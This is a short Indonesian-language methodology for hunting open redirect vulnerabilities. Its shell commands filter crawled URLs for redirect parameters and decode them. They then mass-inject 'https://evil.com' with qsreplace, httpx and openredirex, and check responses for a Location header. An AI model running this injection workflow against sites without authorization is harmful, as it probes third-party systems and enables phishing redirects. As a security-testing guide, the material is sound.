# Methodology Open Redirect

Setelah kita melakukan subdomain enumeration,url crawler,selanjutnya kita akan mencari kandidat untuk open redirect

## Filter Redirect URLs \ 

```bash
cat urls | gf redirect > open-redirect/redirect_candidates.txt
```
Atau

```bash
cat urls | grep -Ei \
"redirect|redirect_uri|redirectUrl|url=|next=|return=|callback|dest|continue|target|returnUrl" \
> open-redirect/redirect_candidates.txt

cat urls | grep -Ei \
"redirect|url=|next=|return|callback|dest|continue|target|goto|r=|u=|to=|ref"
```

## Decode
```bash
# Decode dulu biar keliatan hidden chain
cat open-redirect/redirect_candidates.txt | python3 -c "import sys,urllib.parse; print('\n'.join(urllib.parse.unquote(l.strip()) for l in sys.stdin))" > open-redirect/decoded.txt
```

OPTIONAL
```bash
# Cari double encoding (ini sering jadi bypass)
cat urls | grep -E '%25[0-9A-Fa-f]{2}'
```

## Inject Payload dan Kirim Permintaan 

```bash
cat open-redirect/redirect_candidates.txt | uro | qsreplace 'https://evil.com' | httpx -fr -sc -o open-redirect/redirect_results.txt

```

atau 

```bash
cat open-redirect/decoded.txt | qsreplace 'https://evil.com' | httpx -fr -sc -o open-redirect/results.txt

cat open-redirect/decoded.txt | openredirex -p /openredirex/payloads.txt -k FUZZ -c 50
```


## VALIDASI

```bash
cat open-redirect/redirect_results.txt | while read url; do
  curl -s -I "$url" | grep -i location
done

# Tujuan :
## Cari : 
##Location: https://evil.com
```

## Memastikan

```bash
curl -I -L "URL"
```

## Dengna Tools

```bash
# Aktifkan env
source /myenv/bin/activate

cat open-redirect/redirect_candidates.txt  | qsreplace 'https://evil.com' |  openredirex -p /openredirex/payloads.txt

cat open-redirect/redirect_results.txt | qsreplace "FUZZ" | openredirex -p /openredirex/payloads.txt -k "FUZZ" -c 50

cat open-redirect/redirect_results.txt | qsreplace FUZZ | openredirex -p /openredirex/payloads.txt-k FUZZ -c 50
```


